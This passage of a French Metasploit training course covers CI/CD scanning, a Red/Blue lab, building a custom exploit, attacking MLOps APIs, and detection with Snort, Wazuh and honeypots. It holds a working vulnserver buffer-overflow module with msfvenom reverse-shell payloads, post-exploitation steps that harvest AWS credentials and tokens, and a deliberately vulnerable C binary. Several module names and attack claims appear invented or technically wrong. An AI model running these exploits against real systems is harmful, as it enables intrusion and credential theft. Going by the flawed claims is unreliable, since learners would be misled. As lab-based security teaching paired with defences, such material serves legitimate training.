
✅ De **détecter les vulnérabilités tôt**, dès les phases de build et de staging.

✅ D’**automatiser les tests de sécurité** au même titre que les tests unitaires ou d’intégration.

✅ De **former les développeurs** à écrire du code sécurisé, en montrant les impacts réels de leurs erreurs.

---

## 2. Intégration dans GitLab CI : scénario complet

### Objectif : Scanner une application web exposée en staging (OWASP Juice Shop par exemple)

### 1️⃣ Prérequis

* Un projet GitLab
* Une image Docker vulnérable (ou un conteneur de test)
* Un runner GitLab avec accès au réseau cible

### 2️⃣ Exemple de `.gitlab-ci.yml`

```yaml
stages:
  - security_test

metasploit_scan:
  stage: security_test
  image: kalilinux/kali-rolling
  script:
    - apt update && apt install -y metasploit-framework nmap
    - echo "use auxiliary/scanner/http/http_version" > scan.rc
    - echo "set RHOSTS 172.20.0.10" >> scan.rc
    - echo "set RPORT 3000" >> scan.rc
    - echo "run" >> scan.rc
    - msfconsole -r scan.rc -q -o rapport_scan.txt
  artifacts:
    paths:
      - rapport_scan.txt
```

### ✅ Résultat attendu

* Le pipeline lance un scan HTTP de l’instance vulnérable
* Le résultat est exporté dans `rapport_scan.txt`
* Le fichier est téléchargeable depuis l’interface GitLab

---

## 3. Intégration dans Jenkins : pipeline de sécurité automatisé

### Objectif : Exploiter une machine vulnérable automatiquement en pipeline Jenkins (via agent Docker)

### 1️⃣ Prérequis

* Jenkins installé avec Docker
* Accès réseau vers la cible (VM vulnérable)
* Image Kali avec Metasploit

### 2️⃣ Exemple de `Jenkinsfile`

```groovy
pipeline {
  agent {
    docker {
      image 'kalilinux/kali-rolling'
    }
  }
  stages {
    stage('Install Metasploit') {
      steps {
        sh 'apt update && apt install -y metasploit-framework'
      }
    }
    stage('Scan HTTP') {
      steps {
        writeFile file: 'scan.rc', text: '''
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.56.101
set RPORT 80
run
'''
        sh 'msfconsole -r scan.rc -q -o rapport.txt'
        archiveArtifacts artifacts: 'rapport.txt', fingerprint: true
      }
    }
  }
}
```

### ✅ Résultat attendu

* Jenkins télécharge Metasploit
* Il lance un scan HTTP via `scan.rc`
* Il archive le rapport pour visualisation

---

## 4. Génération de rapports exploitables

Pour que les résultats de Metasploit soient lisibles dans un contexte DevSecOps, ils doivent être :

✅ Exportés dans un fichier (`-o rapport.txt` ou via redirection `>`)

✅ Agrégés dans des tableaux de bord (Grafana, Kibana, ELK, etc.)

✅ Lisibles par des humains non techniques (via parsing/scripting si besoin)

### Exemple de parsing avec `awk`

```bash
awk '/\[\*\]/ {print $0}' rapport.txt > resume.txt
```

Ou convertir en JSON avec un parseur Ruby si vous voulez les envoyer dans un SIEM.

---

## 5. Bonnes pratiques pour ne pas compromettre un environnement de staging

### ✅ Toujours respecter ces règles :

🔐 **N’utiliser Metasploit que sur des environnements isolés** (pas sur la préprod ou la prod !).

🌐 **Limiter les IPs ciblées à des ranges de lab internes**. Exemple : `192.168.x.x`, `10.x.x.x`

🔍 **Utiliser uniquement les modules non destructifs** pour les tests CI/CD (scanners, version check, info leak).

🔁 **Créer des pipelines spécifiques de sécurité**, séparés des pipelines de build.

🪪 **Journaliser toutes les actions**, et versionner les scripts `.rc` utilisés.

⚙️ **Taguer clairement les rapports** avec le nom du test, la CVE ciblée, le module utilisé.

📥 **Gérer les droits d'accès aux rapports sensibles** via GitLab/Jenkins/serveur de logs.

---

## 6. Organisation d’un répertoire de tests DevSecOps

Organisez vos tests comme un projet code :

```
sec_tests/
├── README.md
├── exploit_web.rc
├── scan_ports.rc
├── post_exploit.rc
├── parse_results.py
├── .gitlab-ci.yml
└── jenkinsfile
```

Cela permet :

* La **traçabilité**
* Le **versioning sécurisé**
* La **mutualisation** des scripts entre équipes

---

## ✅ Objectifs atteints

À la fin de ce chapitre, vous savez :

* Intégrer Metasploit dans GitLab CI/CD ou Jenkins
* Générer et archiver des rapports automatisés
* Protéger vos environnements de staging de tout dommage
* Organiser vos tests offensifs comme un vrai projet logiciel sécurisé

Dans le chapitre suivant, vous passerez à la **simulation d’attaques complètes** avec déploiement d’un lab Red Team / Blue Team, exploitation complète, journalisation et remédiation.

> Vous êtes désormais capable d’utiliser Metasploit comme un outil de DevSecOps, intégré, documenté et contrôlé.


---

# Chapitre 7 : Scénarios réalistes d'attaque/défense 

Ce chapitre vous guide pas à pas pour concevoir et déployer des **scénarios réalistes de simulation offensive (Red Team)** dans un **environnement contrôlé**, puis observer la réponse défensive (Blue Team) via **la journalisation et la corrélation des événements** avec des outils comme ELK ou Wazuh. L'objectif est de pratiquer **comme dans une vraie entreprise**, sans jamais rien improviser.

---

## 1. Qu’est-ce qu’un scénario Red Team ?

Un scénario Red Team reproduit **les actions d’un attaquant réel**, mais dans un **environnement isolé** et maîtrisé.

L'objectif est de :

* Tester la robustesse technique ET organisationnelle
* Mettre en lumière les failles réelles
* Faire progresser les capacités de défense (Blue Team)

Chaque scénario doit être :
✅ Réaliste
✅ Reproductible
✅ Traçable
✅ Documenté

---

## 2. Exemple de scénario : Vol de données sensibles via une faille web

### 🎯 Objectif pédagogique

* Identifier un service vulnérable
* Exploiter une faille pour obtenir un shell
* Escalader les privilèges
* Extraire une base de données
* Être détecté par la Blue Team

---

## 3. Déploiement du lab Red/Blue Team local

### 🖥️ Composants

* **Attaquant (Kali Linux)** : avec Metasploit, nmap, Nikto
* **Cible (DVWA, JuiceShop)** : applications web vulnérables
* **SIEM (ELK ou Wazuh)** : pour la journalisation et la détection

### 🐳 Déploiement rapide avec Docker Compose

```yaml
version: '3.7'
services:
  dvwa:
    image: vulnerables/web-dvwa
    ports:
      - "8080:80"
    networks:
      - redblue

  juiceshop:
    image: bkimminich/juice-shop
    ports:
      - "3000:3000"
    networks:
      - redblue

  wazuh:
    image: wazuh/wazuh:latest
    ports:
      - "5601:5601"  # Kibana interface
      - "9200:9200"  # Elasticsearch
    networks:
      - redblue

networks:
  redblue:
    driver: bridge
```

### 📦 Lancer le lab

```bash
docker-compose up -d
```

Accès :

* DVWA : [http://localhost:8080](http://localhost:8080)
* JuiceShop : [http://localhost:3000](http://localhost:3000)
* Kibana/Wazuh : [http://localhost:5601](http://localhost:5601)

---

## 4. Étapes d’un scénario complet d’attaque

### 1️⃣ Phase de reconnaissance

```bash
nmap -sV -p 80,3000 localhost
```

### 2️⃣ Analyse web (Juice Shop)

```bash
nikto -h http://localhost:3000
```

Résultat attendu : XSS, injections, headers faibles.

### 3️⃣ Exploitation avec Metasploit

```bash
msfconsole
search juice
use auxiliary/scanner/http/juiceshop_login
set RHOSTS 172.20.0.3  # IP du conteneur JuiceShop
run
```

### 4️⃣ Injection manuelle (ou SQLMap)

```bash
sqlmap -u "http://localhost:3000/rest/user/login" --data="email=test@a.com&password=abc" --batch
```

### 5️⃣ Reverse shell (ex. via upload malveillant)

* Générer payload :

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=172.20.0.1 LPORT=4444 -f elf > shell.elf
```

* Héberger et exécuter dans JuiceShop

### 6️⃣ Prise de contrôle + escalade

```bash
getuid
sysinfo
run post/linux/gather/enum_configs
```

---

## 5. Journalisation et corrélation avec ELK ou Wazuh

### 🧠 Pourquoi ?

* Suivre les logs de toutes les actions
* Détecter les anomalies en temps réel
* Documenter les intrusions et leur origine

### 📦 Configuration de base avec Wazuh

* Déjà intégré avec Elasticsearch et Kibana
* Accès à l’interface : [http://localhost:5601](http://localhost:5601)

### 🔍 Rechercher les logs d’attaque

* Allez dans Kibana > Discover
* Recherchez des événements `alert`, `sudo`, `connection`, `failed login`

Exemples de queries :

```
agent.name:"juiceshop" AND data.win.system.eventID:4625
message:*meterpreter*
```

### 📊 Visualiser

* Créez un dashboard personnalisé avec :

  * Nombre de connexions entrantes
  * Commandes `bash` suspectes
  * Tentatives de bruteforce

---

## 6. Exercice pratique : Capture the Flag interne

### 🎯 Objectif :

Mettre en place une épreuve Red/Blue interne, avec points attribués pour :

* Accès initial
* Élévation
* Extraction de flag (`/root/flag.txt`)
* Journalisation correcte
* Réaction de la Blue Team

### 📝 Conseils d’organisation

* 2 à 3 machines vulnérables (DVWA, JuiceShop, Metasploitable2)
* 1 instance Kali
* 1 interface Kibana ouverte à tous les observateurs
* Scoreboard manuel ou automatisé

---

## ✅ Objectifs atteints

À la fin de ce chapitre, vous savez :

* Créer un lab Red/Blue complet et réaliste
* Exploiter une application web vulnérable
* Être détecté et tracé par un SIEM (Wazuh/ELK)
* Organiser un mini-CTF pour votre équipe

Dans le chapitre suivant, vous apprendrez comment **créer vos propres exploits Metasploit**, adapter un POC, injecter du shellcode, et automatiser votre chaîne d'exploitation complète.

> Vous êtes maintenant capable de passer du scan à la simulation d’attaque complète, jusqu’à la détection dans une vraie architecture.


---

# Chapitre 8 : Créer son propre exploit 

Ce chapitre vous guide pas à pas dans la **création d’un exploit personnalisé** dans Metasploit. Vous apprendrez à **lire un POC (Proof of Concept)** depuis ExploitDB, à l’adapter dans un module Metasploit, à injecter un **shellcode**, et à déboguer votre exploit avec **GDB + pwndbg**. Chaque étape est **expliquée en détail**, sans rien supposer de vos connaissances.

---

## 1. Objectif du chapitre

Nous allons :

1. Télécharger un POC d’exploit simple sur ExploitDB
2. Comprendre comment il fonctionne
3. Créer un module Metasploit basé sur ce POC
4. Y injecter un shellcode généré avec `msfvenom`
5. Déboguer le tout avec `gdb` et `pwndbg` jusqu’à l’exécution

---

## 2. Choisir un exploit simple et accessible

### 🎯 Cible choisie : vulnérabilité dans `vulnserver` (Windows, stack overflow)

POC ExploitDB : [https://www.exploit-db.com/exploits/9994](https://www.exploit-db.com/exploits/9994)

Nous allons exploiter ce service Windows vulnérable volontairement.

### 🐧 Machine attaquante : Kali Linux

### 🪟 Machine cible : Windows XP avec Vulnserver installé

Télécharger `vulnserver.exe` : [http://www.greyhathacker.net/?page\_id=22](http://www.greyhathacker.net/?page_id=22)

Lancez-le sur la VM Windows, port 9999.

---

## 3. Analyse du POC de base

Voici un extrait du POC en Python :

```python
buffer = "A" * 2003 + "B" * 4 + "C" * (3000-2007)
s = socket.socket()
s.connect(("192.168.56.101", 9999))
s.send("TRUN /.:/" + buffer)
```

### Explication :

* `A * 2003` : remplit le buffer jusqu’à l’EIP (instruction pointer)
* `B * 4` : écrase EIP (on peut y mettre l’adresse du shellcode)
* `C * …` : padding après l’EIP

> Notre but est de remplacer le `"B" * 4` par l’adresse du shellcode, et injecter le shellcode au début du buffer.

---

## 4. Générer le shellcode avec msfvenom

### 🎯 Objectif : reverse shell Windows (via port 4444)

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f c -b "\x00"
```

* `-b "\x00"` : on exclut les octets interdits (`null bytes`)
* `-f c` : format C compatible avec un buffer

Copiez le shellcode généré (commence par `unsigned char buf[] = ...`)

---

## 5. Créer un module Metasploit personnalisé

### 📁 Arborescence

```bash
mkdir -p ~/.msf4/modules/exploits/windows/vulnserver
cd ~/.msf4/modules/exploits/windows/vulnserver
nano vulnserver_trun.rb
```

### 📜 Contenu du module :

```ruby
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Vulnserver TRUN Buffer Overflow',
      'Description'    => 'Stack-based buffer overflow in Vulnserver TRUN command',
      'Author'         => ['Vous'],
      'License'        => MSF_LICENSE,
      'Platform'       => 'win',
      'Targets'        => [['Windows XP SP3', { 'Ret' => 0x625011af }]],
      'Payload'        => {'BadChars' => "\x00"},
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jan 01 2020'))

    register_options([
      Opt::RPORT(9999),
    ])
  end

  def exploit
    connect

    junk = "A" * 2003
    eip = [target['Ret']].pack('V')
    nop = make_nops(16)
    payload_final = junk + eip + nop + payload.encoded

    sock.put("TRUN /.:/" + payload_final)
    disconnect
  end
end
```

💡 L’adresse `0x625011af` est un `jmp esp` trouvé dans `essfunc.dll` de vulnserver (via Mona sous Immunity Debugger).

---

## 6. Lancer et tester l’exploit

Dans Metasploit :

```bash
msfconsole
reload_all
use exploit/windows/vulnserver/vulnserver_trun
set RHOST 192.168.56.101
set LHOST 192.168.56.1
set PAYLOAD windows/shell_reverse_tcp
set LPORT 4444
exploit
```

Sur Kali, ouvrez un listener :

```bash
nc -lvnp 4444
```

🎯 Résultat attendu : connexion inversée de la machine Windows vers Kali

---

## 7. Debugging avec GDB / pwndbg (si cible Linux)

### 🎯 Objectif : créer un exploit sur un binaire Linux vulnérable et comprendre le crash

### 1️⃣ Préparer un binaire vulnérable

```c
// vuln.c
#include <stdio.h>
#include <string.h>

void vulnerable(char *input) {
  char buffer[100];
  strcpy(buffer, input);
}

int main(int argc, char *argv[]) {
  vulnerable(argv[1]);
  return 0;
}
```

Compilez :

```bash
gcc -fno-stack-protector -z execstack vuln.c -o vuln
```

### 2️⃣ Lancer avec un long argument

```bash
./vuln $(python3 -c 'print("A"*200)')
```

### 3️⃣ Ouvrir dans GDB + pwndbg

```bash
gdb ./vuln
run $(python3 -c 'print("A"*200)')
```

### 🔎 Identifier le crash

* `info registers` : pour voir si `EIP` est écrasé
* `pattern_create`, `pattern_offset` : outils pwndbg pour trouver l’offset exact

---

## ✅ Objectifs atteints

À la fin de ce chapitre, vous savez :

* Lire et comprendre un POC d’exploit
* Créer un module Metasploit sur mesure
* Injecter un shellcode dans un buffer overflow
* Debugger un crash pour affiner votre exploit

Dans le prochain chapitre, vous apprendrez comment **adapter Metasploit aux enjeux MLOps**, en attaquant des services exposés (API Flask, modèles ML non protégés), et en sécurisant ces environnements contre les intrusions réelles.

> Vous êtes maintenant capable de transformer un POC d’ExploitDB en module Metasploit prêt à l’emploi.


---

# Chapitre 9 : MLOps & sécurité offensive 

Dans ce chapitre, vous allez découvrir comment **les environnements MLOps mal configurés deviennent des cibles idéales pour une attaque**, comment **exploiter une API Flask exposée**, comment utiliser Metasploit dans ce contexte, et **quelles mesures mettre en place pour se défendre efficacement**. Ce chapitre vous guide **étape par étape, sans raccourcis, sans hypothèses**.

---

## 1. Comprendre les risques spécifiques au MLOps

Les environnements MLOps combinent :

* Des notebooks Jupyter accessibles en HTTP
* Des scripts exécutés à distance
* Des API REST exposant des modèles
* Des conteneurs connectés à des volumes de données sensibles

⚠️ Très souvent, ils sont :

* Exposés sur le port 5000, 8888 ou 6006
* Protégés par un simple token ou pire : aucun mot de passe
* Déployés sans durcissement réseau (ex. : AWS, GCP, OVH publics)

---

## 2. Mise en place d’un environnement vulnérable MLOps

### 🧪 Objectif : déployer une API Flask exposant un modèle ML vulnérable

### 1️⃣ Code de l’API vulnérable (exemple)

Créez un fichier `api.py` :

```python
from flask import Flask, request, jsonify
import pickle
import numpy as np

app = Flask(__name__)
model = pickle.load(open("model.pkl", "rb"))

@app.route("/predict", methods=["POST"])
def predict():
    data = request.get_json()
    prediction = model.predict([np.array(data["features"])])
    return jsonify({"prediction": prediction.tolist()})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

### 2️⃣ Dummy modèle (préparation)

```python
from sklearn.ensemble import RandomForestClassifier
import pickle
import numpy as np

X = np.random.rand(100, 4)
y = np.random.randint(0, 2, 100)
clf = RandomForestClassifier().fit(X, y)
pickle.dump(clf, open("model.pkl", "wb"))
```

### 3️⃣ Lancer l’API Flask

```bash
pip install flask scikit-learn numpy
python api.py
```

Accessible sur : [http://localhost:5000/predict](http://localhost:5000/predict)

---

## 3. Attaque sur l’API avec Metasploit

### 🎯 Objectif : identifier une vulnérabilité RCE (Remote Command Execution)

### 1️⃣ Scanner la cible

```bash
nmap -sV -p 5000 192.168.56.101
```

Résultat : port 5000 ouvert (Flask dev server)

### 2️⃣ Test d’injection directe avec curl

```bash
curl -X POST http://192.168.56.101:5000/predict -H "Content-Type: application/json" \
     -d '{"features": ["__import__('os').system('id')"]}'
```

⚠️ Flask avec `eval()` ou désérialisation non sécurisée est vulnérable.

### 3️⃣ Module Metasploit : désérialisation Python

```bash
msfconsole
search flask
use exploit/multi/http/flask_unsign_rce
set RHOSTS 192.168.56.101
set RPORT 5000
set TARGETURI /predict
set PAYLOAD python/meterpreter/reverse_tcp
set LHOST 192.168.56.1
set LPORT 4444
exploit
```

🎯 Résultat attendu : session Meterpreter sur le conteneur Flask

---

## 4. Post-exploitation typique en environnement MLOps

Une fois connecté via Meterpreter :

### 🔍 1️⃣ Lire les notebooks en clair

```bash
cd /home/ubuntu/
ls -la
cat notebooks/production_model.ipynb
```

### 📦 2️⃣ Voler les modèles

```bash
download model.pkl
```

### 🔑 3️⃣ Extraire les secrets stockés (tokens, API keys)

```bash
grep -r "key" .
grep -r "token" .
```

### 🧬 4️⃣ Accès cloud via clés stockées localement

```bash
cat ~/.aws/credentials
```

---

## 5. Recommandations de sécurité pour les environnements MLOps

### 🔐 1️⃣ Sécuriser les API Flask

* Ne jamais utiliser `eval()` sur des données utilisateur
* Valider le JSON avec un schéma strict (`pydantic`, `jsonschema`)
* Utiliser une authentification robuste (OAuth2, JWT)
* Ajouter un reverse proxy avec filtrage d’IP (nginx + fail2ban)

### 📚 2️⃣ Sécuriser les notebooks

* Interdire l’accès externe à Jupyter (`--ip=127.0.0.1`)
* Ajouter un mot de passe fort ou token jetable
* Utiliser des extensions de sécurité (JupyterHub + LDAP)

### 🧱 3️⃣ Cloisonner les environnements

* Lancer chaque conteneur MLOps dans un namespace réseau isolé
* Utiliser des secrets manager (Vault, AWS Secrets Manager)
* Supprimer les droits `root` sur les conteneurs

### 🛡️ 4️⃣ Monitorer les accès avec Wazuh/ELK

* Journaliser les accès API
* Détecter les appels suspects (`os.system`, `eval`, etc.)
* Intégrer les logs dans un SIEM avec alertes automatiques

---

## ✅ Objectifs atteints

À la fin de ce chapitre, vous savez :

* Déployer un environnement MLOps vulnérable pour tester
* Lancer une attaque sur une API Flask exposée
* Exploiter et compromettre un service ML mal protégé
* Mettre en place des recommandations concrètes pour protéger ces services

Dans le chapitre suivant, vous étudierez les **contre-mesures avancées** : détection comportementale, honeypots, Snort/Suricata, et introduction au Threat Hunting avec Metasploit.

> Vous êtes maintenant capable de comprendre les risques spécifiques du MLOps et de les exploiter comme de les prévenir.


---

# Chapitre 10 : Sécurité avancée & contre-mesures

Dans ce dernier chapitre, vous apprendrez à **repérer les attaques menées avec Metasploit**, à **mettre en place des honeypots** pour piéger les attaquants, à **analyser les comportements suspects avec Snort, Suricata et Zeek**, et à **utiliser les logs pour traquer l'activité d'un attaquant dans vos systèmes**.

---

## 1. Détection des outils offensifs

### Objectif : identifier les présences d’outils comme Metasploit ou nmap via des signatures réseau ou comportementales

### 1.1. Signatures de scan classiques

#### ✅ Exemple avec `nmap`

```bash
nmap -sS -p 1-1000 192.168.56.101
```

Génère des paquets SYN inhabituels non suivis d’ACK

#### ✅ Exemple avec `msfconsole` (scan ou exploit)

* Paquets TCP avec User-Agent → "Mozilla/4.0 compatible" (classique)
* Connexions au port 4444 (listener Metasploit par défaut)

### 1.2. Outils de détection réactive : OSSEC, Wazuh, Fail2ban

* OSSEC/Wazuh peuvent détecter des schémas de connexions répétées (tentatives bruteforce, reverse shells)
* Fail2ban peut bloquer les IPs sur base de motifs de logs (ex. : "Failed password" SSH)

---

## 2. Mise en place de honeypots

### Objectif : créer un système volontairement vulnérable pour capturer les attaques

### 2.1. Honeyd (Linux)

```bash
sudo apt install honeyd
sudo honeyd -d -f /etc/honeyd.conf -i eth0
```

Extrait de `honeyd.conf` :

```bash
default {
    personality "Linux 2.4.20"
    log tcp[23]
    log tcp[80]
    uptime 172800
    tcp port 23 "sh /home/honeypot/start_telnet.sh"
}
```

### 2.2. Cowrie (Honeypot SSH)

```bash
git clone https://github.com/cowrie/cowrie.git
cd cowrie
virtualenv cowrie-env
source cowrie-env/bin/activate
pip install -r requirements.txt
cp etc/cowrie.cfg.dist etc/cowrie.cfg
bin/cowrie start
```

Logs disponibles dans `var/log/cowrie/` (sessions, commandes, IPs)

---

## 3. Détection comportementale avec Snort, Suricata, Zeek

### 3.1. Snort (IDS signature-based)

```bash
sudo apt install snort
```

#### Configuration minimale

Fichier `/etc/snort/snort.conf` :

```bash
include $RULE_PATH/local.rules
```

Créez une règle personnalisée :

```bash
alert tcp any any -> any 4444 (msg:"Metasploit listener detected"; sid:100001; rev:1;)
```

Lancez l'analyse :

```bash
snort -A console -q -c /etc/snort/snort.conf -i eth0
```

### 3.2. Suricata (IDS/IPS moderne)

```bash
sudo apt install suricata
sudo suricata -i eth0 -c /etc/suricata/suricata.yaml -l /var/log/suricata/
```

### 3.3. Zeek (analyse comportementale avancée)

```bash
sudo apt install zeek
sudo zeek -i eth0
```

Analyse en profondeur (DNS, SSL, HTTP, etc.)
Fichiers : `/usr/local/zeek/logs/current/`

---

## 4. Threat Hunting avec les logs Metasploit

### Objectif : traquer les traces d’intrusion post-attaque

### 4.1. Génération de logs d’activité (coté défenseur)

Installer auditd :

```bash
sudo apt install auditd
```

Configurer pour surveiller les fichiers sensibles :

```bash
auditctl -w /etc/passwd -p war -k metasploit_hunt
```

Afficher les événements :

```bash
aureport -k --start today
```

### 4.2. Corrélation avec journaux de session (ELK/Wazuh)

* Identifier les IPs entrantes
* Distinguer les commandes exécutées
* Suivre les fichiers accédés (logs de shell, bash history, etc.)

### 4.3. Indicateurs d’intrusion typiques Metasploit

* Connexions sortantes à port 4444 ou 4443
* Fichiers créés : `.msf4`, `payload.exe`, `shell.php`
* Processus lancés : `cmd.exe`, `powershell.exe`, `meterpreter`

---

## 5. Bonus : dashboard prêt à l’emploi (Wazuh + Kibana)

Accéder à l’interface : `http://localhost:5601`

Créer un dashboard :

* Nombre d’IP ayant tenté une connexion
* Ports les plus ciblés
* Top user-agents suspects
* Alertes Snort/Suricata par date

---

## ✅ Objectifs atteints

* Vous savez repérer les scans ou attaques via Metasploit
* Vous pouvez mettre en place un honeypot actif
* Vous déployez des outils IDS/IPS comportementaux
* Vous comprenez comment analyser des journaux pour du threat hunting


---

# Chapitre 11 : Aller plus loin

Dans ce dernier chapitre, nous allons étendre les compétences acquises pour aborder les usages les plus avancés de Metasploit :

* modules non officiels,
* tests d'intrusion Web,
* automatisation via RPC,
* intégration dans des environnements cloud et conteneurisés (Docker, Kubernetes).

---

## 1. Modules non officiels et Metasploit Pro

### 1.1. Utiliser des modules personnalisés

#### Récupérer un module communautaire

Exemple : `exploit/linux/http/apache_mod_cgi_bash_env_exec`

```bash
cd ~/.msf4/modules/exploits/linux/http/
wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/linux/http/apache_mod_cgi_bash_env_exec.rb
```

#### Charger le module dans Metasploit

```bash
msfconsole
reload_all
use exploit/linux/http/apache_mod_cgi_bash_env_exec
```

### 1.2. Metasploit Pro (version commerciale)

Fonctionnalités avancées :

* Dashboard de campagne
* Rapports professionnels (PDF, HTML)
* Tests en un clic
* Collaboration équipe

Licences d'essai disponibles sur : [https://www.rapid7.com/products/metasploit/download/](https://www.rapid7.com/products/metasploit/download/)

---

## 2. Vulnérabilités Web avec Metasploit

### 2.1. Modules `auxiliary` spécifiques

Lister les modules Web :

```bash
search type:auxiliary name:web
```

Exemples utiles :

* `auxiliary/scanner/http/dir_scanner`
* `auxiliary/scanner/http/http_version`
* `auxiliary/scanner/http/wordpress_login_enum`

### 2.2. Exploiter une faille SQLi (injection SQL)

```bash
use auxiliary/sqli/oracle/dbms_cdc_publish
set RHOSTS 192.168.56.110
set RPORT 80
set URI /vuln.php?id=
run
```

### 2.3. Exploiter une faille XSS

Exemple : `auxiliary/gather/xssed_search`

```bash
use auxiliary/gather/xssed_search
set SEARCH_STRING login
run
```

### 2.4. LFI/RFI avec `auxiliary/scanner/http/lfi`

```bash
use auxiliary/scanner/http/lfi
set RHOSTS 192.168.56.120
set RPORT 80
set PATH /vulnerable.php?file=
run
```

---

## 3. Automatisation avancée avec Metasploit RPC

### 3.1. Activer le service RPC

```bash
msfrpcd -U msf -P mypassword -f -S
```

### 3.2. Utiliser l’API en Python (via `msfrpc` ou `msfrpc-client`)

```bash
pip install msfrpc
```

#### Exemple de script de scan automatisé

```python
from metasploit.msfrpc import MsfRpcClient
client = MsfRpcClient('mypassword')
scanner = client.modules.use('auxiliary', 'scanner/ftp/ftp_version')
scanner['RHOSTS'] = '192.168.56.0/24'
scanner.execute()
```

### 3.3. Utilisation en pipeline (CI/CD)

Créer des scripts automatisés pour exécuter des campagnes de test post-deploiement.
Intégrer avec Jenkins, GitLab CI, etc. via des jobs qui appellent `python` + API RPC

---

## 4. Tests en environnements Cloud et conteneurisés

### 4.1. Scanner une application déployée sur Docker

Déployer un conteneur vulnérable :

```bash
docker run -d -p 8080:80 vulnerables/web-dvwa
```

Scanner avec Metasploit :

```bash
use auxiliary/scanner/http/http_version
set RHOSTS 127.0.0.1
set RPORT 8080
run
```

### 4.2. Cas Kubernetes : pods vulnérables

Installer Minikube :

```bash
curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64
sudo install minikube-linux-amd64 /usr/local/bin/minikube
```

Lancer un cluster local :

```bash
minikube start
```

Déployer une app vulnérable :

```bash
kubectl create deployment dvwa --image=vulnerables/web-dvwa
kubectl expose deployment dvwa --type=NodePort --port=80
minikube service dvwa --url
```

Scanner avec Metasploit comme ci-dessus sur l'URL exposée

### 4.3. Conteneurs à l’intérieur de bastions

Scanner l’hôte puis le réseau interne :

* Reverse shell vers Metasploit
* Enumération avec `post/linux/gather/enum_containers`

---

## ✅ Objectifs atteints

* Vous avez intégré des modules non officiels dans Metasploit
* Vous savez exploiter des vulnérabilités Web (SQLi, XSS, LFI)
* Vous automatisez les tests de sécurité avec Metasploit RPC
* Vous testez même vos environnements cloud et Kubernetes


---

## 📘 Glossaire des termes clés

| Terme                 | Définition                                                                                                         |
| --------------------- | ------------------------------------------------------------------------------------------------------------------ |
| **Exploit**           | Code qui tire parti d'une vulnérabilité pour obtenir un accès ou exécuter une action non autorisée.                |
| **Payload**           | Charge utile livrée via un exploit, comme une shell ou un Meterpreter.                                             |
| **Encoder**           | Méthode pour modifier un payload afin d'échapper à la détection (ex: antivirus).                                   |
| **Module**            | Élément de Metasploit (exploit, scanner, encoder, etc.) utilisé dans une attaque.                                  |
| **Auxiliary**         | Module non-exploit, utilisé pour le scan, le fuzzing ou le déni de service.                                        |
| **Nops**              | Instructions vides insérées pour aligner un payload dans un buffer overflow.                                       |
| **RC Script**         | Script `.rc` pour automatiser des commandes dans `msfconsole`.                                                     |
| **Reverse Shell**     | Shell envoyée à l’attaquant (connecte l’attaqué à l’attaquant).                                                    |
| **Bind Shell**        | Shell à laquelle l’attaquant se connecte (le shell attend les connexions sur la machine compromise).               |
| **Meterpreter**       | Payload interactif avancé permettant le contrôle complet de la machine cible via Metasploit.                       |
| **Post-exploitation** | Actions entreprises après une compromission réussie (extraction de données, persistance, mouvement latéral, etc.). |

---

## 📌 Liste de CVE utilisées dans le cours

| CVE ID             | Description                                                             |
| ------------------ | ----------------------------------------------------------------------- |
| **CVE-2011-2523**  | vsftpd 2.3.4 backdoor - accès root via une fausse réponse smiley :)     |
| **CVE-2020-0796**  | "SMBGhost" - exécution de code à distance sur Windows 10 via SMBv3      |
| **CVE-2017-0144**  | EternalBlue (SMBv1) - utilisé par WannaCry pour propager sur Windows    |
| **CVE-2021-4034**  | Polkit pkexec - local privilege escalation (Linux)                      |
| **CVE-2019-0708**  | BlueKeep (RDP) - exécution à distance sur anciennes versions de Windows |
| **CVE-2021-44228** | Log4Shell - injection de JNDI dans les logs Java (Log4j)                |

---

## 📚 Ressources pour aller plus loin

### Livres

* "Metasploit: The Penetration Tester's Guide" - HD Moore & al.
* "The Hacker Playbook" - Peter Kim
* "Red Team Field Manual (RTFM)" - Ben Clark
* "Violent Python" - TJ O'Connor

### CTF et Labs

* [Hack The Box](https://www.hackthebox.com)
* [TryHackMe](https://tryhackme.com)
* [VulnHub](https://www.vulnhub.com)
* [PentesterLab](https://pentesterlab.com)

### Forums & Communs

* [r/netsec](https://reddit.com/r/netsec)
* [r/AskNetsec](https://reddit.com/r/AskNetsec)
* [0x00sec](https://0x00sec.org)
* [Security StackExchange](https://security.stackexchange.com)

### GitHub et outils

* [https://github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)
* [https://github.com/0xdea/exploits](https://github.com/0xdea/exploits)
* [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
* [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)
* [https://github.com/nmap/nmap](https://github.com/nmap/nmap)
* [https://github.com/trimstray/the-book-of-secret-knowledge](https://github.com/trimstray/the-book-of-secret-knowledge)

---

## ✅ Checklists DevSecOps intégrant Metasploit

### 🔒 Environnement de test

* [ ] Isoler un réseau local à des fins de test (VM, NAT, VirtualBox/VMWare)
* [ ] Utiliser des machines vulnérables connues (ex: Metasploitable, DVWA)
* [ ] Scanner les IP autorisées uniquement (jamais de scan sur Internet sans autorisation)

### 🧪 Tests récurrents

* [ ] Inclure `msfconsole -r` dans un pipeline CI/CD de sécurité
* [ ] Scanner les dépendances et les ports de build docker
* [ ] Exécuter un scan aux/ avec journalisation automatisée

### 🧩 Intégration SecOps

* [ ] Exporter les logs Metasploit vers un SIEM
* [ ] Corréler les scans/détections avec Wazuh ou ELK
* [ ] Déclencher une alerte en cas d’exploitation

### 📤 Rapports et audit

* [ ] Générer automatiquement un rapport HTML/PDF de chaque campagne
* [ ] Archiver les scripts `.rc`, les CVE utilisées et les preuves
* [ ] Noter les contremesures recommandées (correctifs, durcissement, etc.)

---

> Ces annexes sont une boîte à outils permanente pour tout professionnel DevSecOps, Red/Blue Team ou MLOps cherchant à intégrer Metasploit dans une chaîne de sécurité offensive et défensive moderne.


---

